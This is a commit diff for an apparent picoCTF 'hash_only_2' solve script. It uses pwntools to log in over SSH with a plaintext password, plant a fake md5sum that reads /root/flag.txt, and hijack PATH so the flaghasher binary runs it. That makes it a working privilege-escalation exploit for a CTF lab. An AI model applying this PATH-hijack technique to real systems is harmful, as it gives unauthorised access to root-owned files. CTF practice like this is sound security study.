1987369f55788f77357a776f7a9423b8f53a9f39
s1d15 <mnhatnguyen06@gmail.com>
2026-04-25 21:07:26 +1000

    Update solution for hash_only_2 to exploit locally

--- pwn/hash_only_2/solve.py
+++ pwn/hash_only_2/solve.py
@@ -1,9 +1,12 @@
-"""
-ssh ctf-player@rescued-float.picoctf.net -p 52989 -t "bash --noprofile"
-find / -type f -name "flaghasher"
-cd /usr/local/bin
-echo "/usr/bin/cat /root/flag.txt" > md5sum
-chmod +x md5sum
-PATH=.
-./flaghasher
-"""
+from pwn import *
+
+PORT = 51357
+s = ssh(user='ctf-player', host='rescued-float.picoctf.net', port=PORT, password='483e80d4')
+sh = s.shell('bash --noprofile')
+sh.sendline('cd /usr/local/bin')
+sh.sendline('echo "/usr/bin/cat /root/flag.txt" > md5sum')
+sh.sendline('chmod +x md5sum')
+sh.sendline('PATH=.')
+sh.sendline('./flaghasher')
+flag = sh.recvuntil('}').decode().strip().split('\n')[-1]
+print(flag)
